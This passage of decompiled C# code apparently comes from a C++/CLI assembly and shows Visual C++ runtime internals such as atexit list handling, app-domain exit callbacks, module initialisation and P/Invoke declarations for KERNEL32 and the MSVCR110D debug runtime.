      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EExit();
      flag = true;
    }
    return flag;
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003FA0x9fef5dfa\u002E__alloc_global_lock()
  {
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EAddRef();
    return \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized();
  }

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static void \u003FA0x9fef5dfa\u002E__dealloc_global_lock() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002ERemoveRef();

  [SecurityCritical]
  internal static unsafe int _atexit_helper(
    __FnPtr<void ()> func,
    uint* __pexit_list_size,
    __FnPtr<void ()>** __ponexitend_e,
    __FnPtr<void ()>** __ponexitbegin_e)
  {
    // ISSUE: cast to a function pointer type
    __FnPtr<void ()> local1 = (__FnPtr<void ()>) 0;
    int num1;
    if (func == null)
    {
      num1 = -1;
    }
    else
    {
      if (\u003CModule\u003E.\u003FA0x9fef5dfa\u002E__global_lock())
      {
        try
        {
          __FnPtr<void ()>* Ptr1 = (__FnPtr<void ()>*) \u003CModule\u003E.DecodePointer((void*) *(int*) __ponexitbegin_e);
          __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u003CModule\u003E.DecodePointer((void*) *(int*) __ponexitend_e);
          if ((UIntPtr) ((int) *__pexit_list_size - 1) < (UIntPtr) ((int*) local2 - (int*) Ptr1))
          {
            try
            {
              uint num2 = *__pexit_list_size * 4U >= 2048U ? 2048U : *__pexit_list_size * 4U;
              IntPtr cb = new IntPtr((int) *__pexit_list_size * 4 + (int) num2);
              IntPtr num3 = Marshal.ReAllocHGlobal(new IntPtr((void*) Ptr1), cb);
              local2 = (__FnPtr<void ()>*) ((IntPtr) num3.ToPointer() + (IntPtr) local2 - (IntPtr) Ptr1);
              Ptr1 = (__FnPtr<void ()>*) num3.ToPointer();
              uint num4 = 512U >= *__pexit_list_size ? *__pexit_list_size : 512U;
              uint* numPtr = __pexit_list_size;
              int num5 = (int) *numPtr + (int) num4;
              *numPtr = (uint) num5;
            }
            catch (OutOfMemoryException ex)
            {
              IntPtr cb = new IntPtr((int) *__pexit_list_size * 4 + 8);
              IntPtr num6 = Marshal.ReAllocHGlobal(new IntPtr((void*) Ptr1), cb);
              local2 = (__FnPtr<void ()>*) ((IntPtr) num6.ToPointer() + (IntPtr) local2 - (IntPtr) Ptr1);
              Ptr1 = (__FnPtr<void ()>*) num6.ToPointer();
              uint* numPtr = __pexit_list_size;
              int num7 = (int) *numPtr + 4;
              *numPtr = (uint) num7;
            }
          }
          *(int*) local2 = (int) func;
          __FnPtr<void ()>* Ptr2 = (__FnPtr<void ()>*) ((IntPtr) local2 + 4);
          local1 = func;
          *(int*) __ponexitbegin_e = (int) \u003CModule\u003E.EncodePointer((void*) Ptr1);
          *(int*) __ponexitend_e = (int) \u003CModule\u003E.EncodePointer((void*) Ptr2);
        }
        catch (OutOfMemoryException ex)
        {
        }
        finally
        {
          \u003CModule\u003E.\u003FA0x9fef5dfa\u002E__global_unlock();
        }
      }
      num1 = local1 != null ? 0 : -1;
    }
    return num1;
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static unsafe int _initatexit_app_domain()
  {
    if (\u003CModule\u003E.\u003FA0x9fef5dfa\u002E__alloc_global_lock())
    {
      \u003CModule\u003E.__onexitbegin_app_domain = (__FnPtr<void ()>*) \u003CModule\u003E.EncodePointer(Marshal.AllocHGlobal(128).ToPointer());
      \u003CModule\u003E.__onexitend_app_domain = \u003CModule\u003E.__onexitbegin_app_domain;
      \u003CModule\u003E.__exit_list_size_app_domain = 32U;
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E._atexit_m_appdomain((__FnPtr<void ()>) __methodptr(__clean_type_info_names));
    }
    return 1;
  }

  [HandleProcessCorruptedStateExceptions]
  [SecurityCritical]
  internal static unsafe void _app_exit_callback()
  {
    if (\u003CModule\u003E.__exit_list_size_app_domain == 0U)
      return;
    __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u003CModule\u003E.DecodePointer((void*) \u003CModule\u003E.__onexitbegin_app_domain);
    __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u003CModule\u003E.DecodePointer((void*) \u003CModule\u003E.__onexitend_app_domain);
    try
    {
      if ((IntPtr) local1 == new IntPtr(-1) || (IntPtr) local1 == IntPtr.Zero || (IntPtr) local2 == IntPtr.Zero)
        return;
      __FnPtr<void ()>* local3 = local1;
      __FnPtr<void ()>* local4 = local2;
      while (true)
      {
        do
        {
          local2 -= 4;
        }
        while (local2 >= local1 && (IntPtr) *(int*) local2 == (IntPtr) \u003CModule\u003E.EncodePointer((void*) 0));
        if (local2 < local1)
          break;
        // ISSUE: cast to a function pointer type
        __FnPtr<void ()> local5 = (__FnPtr<void ()>) (IntPtr) \u003CModule\u003E.DecodePointer((void*) *(int*) local2);
        *(int*) local2 = (int) \u003CModule\u003E.EncodePointer((void*) 0);
        // ISSUE: function pointer call
        __calli(local5)();
        __FnPtr<void ()>* local6 = (__FnPtr<void ()>*) \u003CModule\u003E.DecodePointer((void*) \u003CModule\u003E.__onexitbegin_app_domain);
        __FnPtr<void ()>* local7 = (__FnPtr<void ()>*) \u003CModule\u003E.DecodePointer((void*) \u003CModule\u003E.__onexitend_app_domain);
        if (local3 != local6 || local4 != local7)
        {
          local3 = local6;
          local1 = local3;
          local4 = local7;
          local2 = local4;
        }
      }
    }
    finally
    {
      Marshal.FreeHGlobal(new IntPtr((void*) local1));
      \u003CModule\u003E.\u003FA0x9fef5dfa\u002E__dealloc_global_lock();
    }
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static unsafe int _atexit_m_appdomain(__FnPtr<void ()> func) => \u003CModule\u003E._atexit_helper((__FnPtr<void ()>) (IntPtr) \u003CModule\u003E.EncodePointer((void*) func), &\u003CModule\u003E.__exit_list_size_app_domain, &\u003CModule\u003E.__onexitend_app_domain, &\u003CModule\u003E.__onexitbegin_app_domain);

  [SuppressUnmanagedCodeSecurity]
  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DllImport("KERNEL32.dll")]
  public static extern unsafe void* DecodePointer(void* Ptr);

  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SuppressUnmanagedCodeSecurity]
  [DllImport("KERNEL32.dll")]
  public static extern unsafe void* EncodePointer(void* Ptr);

  [DebuggerStepThrough]
  internal static ModuleHandle \u003CCrtImplementationDetails\u003E\u002EThisModule\u002EHandle() => typeof (ThisModule).Module.ModuleHandle;

  [SecurityCritical]
  [DebuggerStepThrough]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe void _initterm_m(__FnPtr<void* ()>* pfbegin, __FnPtr<void* ()>* pfend)
  {
    for (; pfbegin < pfend; pfbegin += 4)
    {
      if (*(int*) pfbegin != 0)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        void* voidPtr = __calli(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThisModule\u002EResolveMethod\u003Cvoid\u0020const\u0020\u002A\u0020__clrcall\u0028void\u0029\u003E((__FnPtr<void* ()>) *(int*) pfbegin))();
      }
    }
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static unsafe __FnPtr<void* ()> \u003CCrtImplementationDetails\u003E\u002EThisModule\u002EResolveMethod\u003Cvoid\u0020const\u0020\u002A\u0020__clrcall\u0028void\u0029\u003E(
    __FnPtr<void* ()> methodToken)
  {
    // ISSUE: cast to a function pointer type
    return (__FnPtr<void* ()>) (IntPtr) \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThisModule\u002EHandle().ResolveMethodHandle((int) methodToken).GetFunctionPointer().ToPointer();
  }

  [HandleProcessCorruptedStateExceptions]
  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe void __clean_type_info_names_internal(
    __type_info_node* p_type_info_root_node)
  {
    bool flag = false;
    RuntimeHelpers.PrepareConstrainedRegions();
    try
    {
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
      }
      finally
      {
        Thread.BeginThreadAffinity();
        \u003CModule\u003E._lock(14);
        flag = true;
      }
      __type_info_node* typeInfoNodePtr1 = (__type_info_node*) *(int*) ((IntPtr) p_type_info_root_node + 4);
      __type_info_node* typeInfoNodePtr2;
      for (; (IntPtr) typeInfoNodePtr1 != IntPtr.Zero; typeInfoNodePtr1 = typeInfoNodePtr2)
      {
        typeInfoNodePtr2 = (__type_info_node*) *(int*) ((IntPtr) typeInfoNodePtr1 + 4);
        \u003CModule\u003E._free_base((void*) *(int*) typeInfoNodePtr1);
        \u003CModule\u003E._free_base((void*) typeInfoNodePtr1);
      }
    }
    finally
    {
      if (flag)
      {
        \u003CModule\u003E._unlock(14);
        Thread.EndThreadAffinity();
      }
    }
  }

  [SecuritySafeCritical]
  internal static unsafe void __clean_type_info_names() => \u003CModule\u003E.__clean_type_info_names_internal(&\u003CModule\u003E.__type_info_root_node);

  [SuppressUnmanagedCodeSecurity]
  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DllImport("msvcr110D.dll", CallingConvention = CallingConvention.Cdecl)]
  public static extern void _unlock(int _File);

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SuppressUnmanagedCodeSecurity]
  [SecurityCritical]
  [DllImport("msvcr110D.dll", CallingConvention = CallingConvention.Cdecl)]
  public static extern void _lock(int _File);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe void* __AdjustPointer([In] void* obj0, [In] PMD* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", EntryPoint = "?_inconsistency@@YAXXZ", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern void _inconsistency();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe int _IsExceptionObjectToBeDestroyed([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", EntryPoint = "?terminate@@YAXXZ", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern void terminate();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", EntryPoint = "?_ValidateRead@@YAHPBXI@Z", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe int _ValidateRead([In] void* obj0, [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe FrameInfo* _CreateFrameInfo([In] FrameInfo* obj0, [In] void* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe int strcmp([In] sbyte* obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", EntryPoint = "?_ValidateWrite@@YAHPAXI@Z", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe int _ValidateWrite([In] void* obj0, [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe void _FindAndUnlinkFrame([In] FrameInfo* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", EntryPoint = "?_ValidateExecute@@YAHP6GHXZ@Z", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern int _ValidateExecute([In] __FnPtr<int ()> obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe void* memmove([In] void* obj0, [In] void* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe int __FrameUnwindFilter([In] _EXCEPTION_POINTERS* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("MSVCR110D.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  internal static extern unsafe void _free_base([In] void* obj0);
}
